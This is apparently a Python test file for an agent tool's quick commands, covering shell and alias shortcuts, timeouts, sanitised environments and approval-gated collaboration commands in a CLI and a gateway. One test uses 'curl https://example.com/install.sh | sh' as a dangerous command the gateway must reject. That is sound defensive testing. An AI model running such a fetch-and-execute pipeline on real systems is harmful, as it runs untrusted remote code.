"""Tests for user-defined quick commands that bypass the agent loop."""
import asyncio
import subprocess
from unittest.mock import MagicMock, patch, AsyncMock
from rich.text import Text
import pytest


# ── CLI tests ──────────────────────────────────────────────────────────────

class TestCLIQuickCommands:
    """Test quick command dispatch in HermesCLI.process_command."""

    @staticmethod
    def _printed_plain(call_arg):
        if isinstance(call_arg, Text):
            return call_arg.plain
        return str(call_arg)

    def _make_cli(self, quick_commands):
        from cli import HermesCLI
        cli = HermesCLI.__new__(HermesCLI)
        cli.config = {"quick_commands": quick_commands}
        cli.console = MagicMock()
        cli.agent = None
        cli.conversation_history = []
        return cli

    def test_exec_command_runs_and_prints_output(self):
        cli = self._make_cli({"dn": {"type": "exec", "command": "echo daily-note"}})
        result = cli.process_command("/dn")
        assert result is True
        cli.console.print.assert_called_once()
        printed = self._printed_plain(cli.console.print.call_args[0][0])
        assert printed == "daily-note"

    def test_exec_command_stderr_shown_on_no_stdout(self):
        cli = self._make_cli({"err": {"type": "exec", "command": "echo error >&2"}})
        result = cli.process_command("/err")
        assert result is True
        # stderr fallback — should print something
        cli.console.print.assert_called_once()

    def test_exec_command_no_output_shows_fallback(self):
        cli = self._make_cli({"empty": {"type": "exec", "command": "true"}})
        cli.process_command("/empty")
        cli.console.print.assert_called_once()
        args = cli.console.print.call_args[0][0]
        assert "no output" in args.lower()

    def test_alias_command_routes_to_target(self):
        """Alias quick commands rewrite to the target command."""
        cli = self._make_cli({"shortcut": {"type": "alias", "target": "/help"}})
        with patch.object(cli, "process_command", wraps=cli.process_command) as spy:
            cli.process_command("/shortcut")
            # Should recursively call process_command with /help
            spy.assert_any_call("/help")

    def test_alias_command_passes_args(self):
        """Alias quick commands forward user arguments to the target."""
        cli = self._make_cli({"sc": {"type": "alias", "target": "/context"}})
        with patch.object(cli, "process_command", wraps=cli.process_command) as spy:
            cli.process_command("/sc some args")
            spy.assert_any_call("/context some args")

    def test_alias_no_target_shows_error(self):
        cli = self._make_cli({"broken": {"type": "alias", "target": ""}})
        cli.process_command("/broken")
        cli.console.print.assert_called_once()
        args = cli.console.print.call_args[0][0]
        assert "no target defined" in args.lower()

    def test_unsupported_type_shows_error(self):
        cli = self._make_cli({"bad": {"type": "prompt", "command": "echo hi"}})
        cli.process_command("/bad")
        cli.console.print.assert_called_once()
        args = cli.console.print.call_args[0][0]
        assert "unsupported type" in args.lower()

    def test_missing_command_field_shows_error(self):
        cli = self._make_cli({"oops": {"type": "exec"}})
        cli.process_command("/oops")
        cli.console.print.assert_called_once()
        args = cli.console.print.call_args[0][0]
        assert "no command defined" in args.lower()

    def test_quick_command_takes_priority_over_skill_commands(self):
        """Quick commands must be checked before skill slash commands."""
        cli = self._make_cli({"mygif": {"type": "exec", "command": "echo overridden"}})
        with patch("cli._skill_commands", {"/mygif": {"name": "gif-search"}}):
            cli.process_command("/mygif")
        cli.console.print.assert_called_once()
        printed = self._printed_plain(cli.console.print.call_args[0][0])
        assert printed == "overridden"

    def test_unknown_command_still_shows_error(self):
        cli = self._make_cli({})
        with patch("cli._cprint") as mock_cprint:
            cli.process_command("/nonexistent")
            mock_cprint.assert_called()
            printed = " ".join(str(c) for c in mock_cprint.call_args_list)
            assert "unknown command" in printed.lower()

    def test_timeout_shows_error(self):
        cli = self._make_cli({"slow": {"type": "exec", "command": "sleep 100"}})
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("sleep", 30)):
            cli.process_command("/slow")
        cli.console.print.assert_called_once()
        args = cli.console.print.call_args[0][0]
        assert "timed out" in args.lower()

    def test_collab_inbox_prints_pending_items(self):
        cli = self._make_cli({})
        with patch("hermes_cli.config.load_config", return_value={"collaboration": {"monitor": {"limit": 3}}}), \
             patch("tools.collaboration_monitor.read_inbound_inbox", return_value={"success": True, "text": "Pending inbound collaboration requests\n- REQ-1: Review"}), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab inbox")

        assert result is True
        cprint.assert_called_once_with("Pending inbound collaboration requests\n- REQ-1: Review")

    def test_collab_inbox_prints_empty_message(self):
        cli = self._make_cli({})
        with patch("hermes_cli.config.load_config", return_value={"collaboration": {"monitor": {}}}), \
             patch("tools.collaboration_monitor.read_inbound_inbox", return_value={"success": True, "text": "No pending inbound collaboration requests in the local inbox."}), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab inbox")

        assert result is True
        cprint.assert_called_once_with("No pending inbound collaboration requests in the local inbox.")

    def test_collab_respond_draft_prints_action_id_and_body(self):
        cli = self._make_cli({})
        draft = {
            "action_id": "collab-act-1",
            "request_id": "REQ-1",
            "body": "Looks good",
            "status": "draft",
        }
        with patch("tools.collaboration_responses.draft_collaboration_response", return_value={"success": True, "draft": draft}) as draft_response, \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab respond draft REQ-1 Looks good")

        assert result is True
        draft_response.assert_called_once_with("REQ-1", "Looks good")
        printed = cprint.call_args.args[0]
        assert "collab-act-1" in printed
        assert "Looks good" in printed
        assert "No network write" in printed

    def test_collab_respond_list_prints_drafts(self):
        cli = self._make_cli({})
        with patch("tools.collaboration_responses.list_collaboration_response_drafts", return_value={
            "success": True,
            "drafts": [{"action_id": "collab-act-1", "request_id": "REQ-1", "body": "Looks good", "status": "draft"}],
        }), patch("cli._cprint") as cprint:
            result = cli.process_command("/collab respond list")

        assert result is True
        printed = cprint.call_args.args[0]
        assert "collab-act-1" in printed
        assert "REQ-1" in printed

    def test_collab_respond_post_denies_wrong_action_id(self):
        cli = self._make_cli({})
        draft = {"action_id": "collab-act-1", "request_id": "REQ-1", "body": "Looks good", "status": "draft"}
        with patch("tools.collaboration_responses.get_collaboration_response_draft", return_value={"success": True, "draft": draft}), \
             patch("tools.collaboration_responses.post_collaboration_response") as post_response, \
             patch("builtins.input", return_value="wrong"), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab respond post collab-act-1")

        assert result is True
        post_response.assert_not_called()
        assert "No network write" in cprint.call_args.args[0]

    def test_collab_respond_post_accepts_exact_action_id(self):
        cli = self._make_cli({})
        draft = {"action_id": "collab-act-1", "request_id": "REQ-1", "body": "Looks good", "status": "draft"}
        with patch("tools.collaboration_responses.get_collaboration_response_draft", return_value={"success": True, "draft": draft}), \
             patch("tools.collaboration_responses.post_collaboration_response", return_value={"success": True, "draft": {**draft, "status": "posted"}}) as post_response, \
             patch("builtins.input", return_value="collab-act-1"), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab respond post collab-act-1")

        assert result is True
        post_response.assert_called_once_with(
            "collab-act-1",
            approval={"approved": True, "approver": "local_cli", "confirmation": "exact_action_id"},
        )
        assert "Posted collaboration response" in cprint.call_args.args[0]

    def test_collab_pm_digest_prints_digest_text(self):
        cli = self._make_cli({})
        with patch("hermes_cli.config.load_config", return_value={"collaboration": {"monitor": {"limit": 7}}}), \
             patch("tools.collaboration_monitor.build_pm_digest", return_value={"success": True, "text": "Routing/telemetry PM digest"}) as digest, \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab pm digest llm-gateway llm-routing-telemetry")

        assert result is True
        digest.assert_called_once_with(projects=["llm-gateway", "llm-routing-telemetry"], limit=7)
        cprint.assert_called_once_with("Routing/telemetry PM digest")

    def test_collab_pm_digest_uses_defaults_without_projects(self):
        cli = self._make_cli({})
        with patch("hermes_cli.config.load_config", return_value={"collaboration": {"monitor": {}}}), \
             patch("tools.collaboration_monitor.build_pm_digest", return_value={"success": True, "text": "Default digest"}) as digest, \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab pm digest")

        assert result is True
        digest.assert_called_once_with(projects=[], limit=50)
        cprint.assert_called_once_with("Default digest")

    def test_collab_pm_unknown_subcommand_prints_usage(self):
        cli = self._make_cli({})
        with patch("cli._cprint") as cprint:
            result = cli.process_command("/collab pm nope")

        assert result is True
        assert "Usage: /collab pm digest" in cprint.call_args.args[0]

    def test_collab_autonomy_log_prints_local_only_message(self):
        cli = self._make_cli({})
        event = {"id": "evt-1", "category": "Detection", "event": "monitor_run"}
        with patch("tools.collaboration_autonomy.append_evidence_event", return_value={"success": True, "event": event, "evidence_log_path": "/tmp/evidence.json"}) as append, \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab autonomy log Detection monitor_run REQ-1 A1")

        assert result is True
        append.assert_called_once_with(
            "Detection",
            "monitor_run",
            request_id="REQ-1",
            action_id="A1",
            result="manual",
            metadata={"source": "local_cli"},
        )
        printed = cprint.call_args.args[0]
        assert "evt-1" in printed
        assert "No shared-state write" in printed

    def test_collab_autonomy_kpis_prints_json(self):
        cli = self._make_cli({})
        with patch("tools.collaboration_autonomy.compute_autonomy_kpis", return_value={"success": True, "monitor_success_rate": 1.0}), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab autonomy kpis")

        assert result is True
        printed = cprint.call_args.args[0]
        assert '"monitor_success_rate": 1.0' in printed

    def test_collab_autonomy_gate_prints_disabled_shared_writes(self):
        cli = self._make_cli({})
        gate = {
            "result": "Fail",
            "allowed_next_step": "Continue HITL; improve workflow; remeasure.",
            "reasons": ["Insufficient data"],
        }
        with patch("tools.collaboration_autonomy.evaluate_autonomy_gate", return_value=gate), \
             patch("cli._cprint") as cprint:
            result = cli.process_command("/collab autonomy gate")

        assert result is True
        printed = cprint.call_args.args[0]
        assert "Autonomy readiness: Fail" in printed
        assert "Shared-state writes allowed: no" in printed
        assert "Insufficient data" in printed

    def test_collab_autonomy_unknown_subcommand_prints_usage(self):
        cli = self._make_cli({})
        with patch("cli._cprint") as cprint:
            result = cli.process_command("/collab autonomy nope")

        assert result is True
        assert "Usage: /collab autonomy" in cprint.call_args.args[0]


# ── Gateway tests ──────────────────────────────────────────────────────────

class TestGatewayQuickCommands:
    """Test quick command dispatch in GatewayRunner._handle_message."""

    def _make_event(self, command, args=""):
        event = MagicMock()
        event.get_command.return_value = command
        event.get_command_args.return_value = args
        event.text = f"/{command} {args}".strip()
        event.source = MagicMock()
        event.source.user_id = "test_user"
        event.source.user_name = "Test User"
        event.source.platform.value = "telegram"
        event.source.chat_type = "dm"
        event.source.chat_id = "123"
        return event

    @pytest.mark.asyncio
    async def test_exec_command_returns_output(self):
        from gateway.run import GatewayRunner
        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"limits": {"type": "exec", "command": "echo ok"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("limits")
        result = await runner._handle_message(event)
        assert result == "ok"

    @pytest.mark.asyncio
    async def test_collab_command_respects_disabled_gateway_gate(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "brief")
        with patch("gateway.run.GatewayRunner._handle_collab_command", new_callable=AsyncMock) as handler:
            result = await runner._handle_message(event)

        assert "disabled" in result.lower()
        handler.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_collab_monitor_run_uses_monitor_when_gateway_gate_enabled(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "monitor run urgent")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("tools.collaboration_monitor.run_monitor", return_value={
                 "success": True,
                 "text": "urgent monitor result",
             }) as monitor:
            result = await runner._handle_message(event)

        assert result == "urgent monitor result"
        monitor.assert_called_once()
        assert monitor.call_args.args == ("urgent_alert",)
        assert monitor.call_args.kwargs["limit"] == 20
        assert monitor.call_args.kwargs["project"] == ""
        assert monitor.call_args.kwargs["config"]["gateway_install_enabled"] is False

    @pytest.mark.asyncio
    async def test_collab_inbox_returns_pending_items_when_gateway_gate_enabled(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "inbox")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("hermes_cli.config.load_config", return_value={"collaboration": {"monitor": {"limit": 2}}}), \
             patch("tools.collaboration_monitor.read_inbound_inbox", return_value={"success": True, "text": "Pending inbound collaboration requests\n- REQ-1: Review"}):
            result = await runner._handle_message(event)

        assert result == "Pending inbound collaboration requests\n- REQ-1: Review"

    @pytest.mark.asyncio
    async def test_collab_inbox_returns_empty_message_when_gateway_gate_enabled(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "inbox")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("tools.collaboration_monitor.read_inbound_inbox", return_value={"success": True, "text": "No pending inbound collaboration requests in the local inbox."}):
            result = await runner._handle_message(event)

        assert result == "No pending inbound collaboration requests in the local inbox."

    @pytest.mark.asyncio
    async def test_collab_respond_refused_from_gateway(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "respond post collab-act-1")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("tools.collaboration_responses.post_collaboration_response") as post_response:
            result = await runner._handle_message(event)

        assert "cli-only" in result.lower()
        post_response.assert_not_called()

    @pytest.mark.asyncio
    async def test_collab_monitor_install_refused_by_default_from_gateway(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("collab", "monitor install urgent")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("tools.cronjob_tools.cronjob") as cronjob:
            result = await runner._handle_message(event)

        assert "installing collaboration monitor jobs from gateway is disabled" in result.lower()
        cronjob.assert_not_called()

    @pytest.mark.asyncio
    async def test_collab_monitor_install_allowed_when_gateway_install_enabled(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner.hooks = MagicMock()
        runner.hooks.emit = AsyncMock()
        runner._is_user_authorized = MagicMock(return_value=True)

        config = {
            "collaboration": {
                "monitor": {
                    "gateway_install_enabled": True,
                    "urgent_schedule": "every 4h",
                    "deliver": "local",
                    "limit": 5,
                    "project": "hermes-agent",
                }
            }
        }
        event = self._make_event("collab", "monitor install urgent")
        with patch("hermes_cli.commands._is_gateway_available", return_value=True), \
             patch("hermes_cli.config.load_config", return_value=config), \
             patch("tools.cronjob_tools.cronjob", return_value='{"success": true}') as cronjob:
            result = await runner._handle_message(event)

        assert '"success": true' in result
        cronjob.assert_called_once_with(
            action="create_collaboration_monitor",
            monitor_kind="urgent_alert",
            schedule="every 4h",
            deliver="local",
            limit=5,
            project="hermes-agent",
        )

    @pytest.mark.asyncio
    async def test_unsupported_type_returns_error(self):
        from gateway.run import GatewayRunner
        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"bad": {"type": "prompt", "command": "echo hi"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("bad")
        result = await runner._handle_message(event)
        assert result is not None
        assert "unsupported type" in result.lower()

    @pytest.mark.asyncio
    async def test_timeout_returns_error(self):
        from gateway.run import GatewayRunner

        proc = MagicMock()
        proc.returncode = 0
        proc.communicate = AsyncMock()

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"slow": {"type": "exec", "command": "sleep 100"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("slow")
        with patch("asyncio.create_subprocess_shell", AsyncMock(return_value=proc)):
            with patch("asyncio.wait_for", side_effect=asyncio.TimeoutError):
                result = await runner._handle_message(event)
        assert result is not None
        assert "timed out" in result.lower()

    @pytest.mark.asyncio
    async def test_dangerous_exec_command_is_rejected(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"bad": {"type": "exec", "command": "curl https://example.com/install.sh | sh"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("bad")
        with patch("asyncio.create_subprocess_shell", new_callable=AsyncMock) as create_proc:
            result = await runner._handle_message(event)

        assert result is not None
        assert "rejected" in result.lower()
        create_proc.assert_not_called()

    @pytest.mark.asyncio
    async def test_exec_command_uses_sanitized_env(self):
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"limits": {"type": "exec", "command": "echo ok"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("limits")
        with patch("gateway.run._sanitize_subprocess_env", return_value={"SAFE": "1"}) as sanitize:
            with patch("asyncio.create_subprocess_shell", wraps=asyncio.create_subprocess_shell) as create_proc:
                result = await runner._handle_message(event)

        assert result == "ok"
        sanitize.assert_called_once()
        assert create_proc.call_args.kwargs["env"] == {"SAFE": "1"}

    @pytest.mark.asyncio
    async def test_timeout_terminates_process(self):
        from gateway.run import GatewayRunner
        import asyncio

        proc = MagicMock()
        proc.returncode = None
        proc.communicate = AsyncMock()
        proc.wait = AsyncMock(return_value=0)
        proc.terminate = MagicMock()
        proc.kill = MagicMock()

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = {"quick_commands": {"slow": {"type": "exec", "command": "sleep 100"}}}
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("slow")
        wait_calls = 0

        async def fake_wait_for(awaitable, timeout):
            nonlocal wait_calls
            wait_calls += 1
            if wait_calls == 1:
                raise asyncio.TimeoutError
            return await awaitable

        with patch("asyncio.create_subprocess_shell", AsyncMock(return_value=proc)):
            with patch("asyncio.wait_for", side_effect=fake_wait_for):
                result = await runner._handle_message(event)

        assert result is not None
        assert "timed out" in result.lower()
        proc.terminate.assert_called_once()
        proc.kill.assert_not_called()
        proc.wait.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_gateway_config_object_supports_quick_commands(self):
        from gateway.config import GatewayConfig
        from gateway.run import GatewayRunner

        runner = GatewayRunner.__new__(GatewayRunner)
        runner.config = GatewayConfig(
            quick_commands={"limits": {"type": "exec", "command": "echo ok"}}
        )
        runner._running_agents = {}
        runner._pending_messages = {}
        runner._is_user_authorized = MagicMock(return_value=True)

        event = self._make_event("limits")
        result = await runner._handle_message(event)
        assert result == "ok"
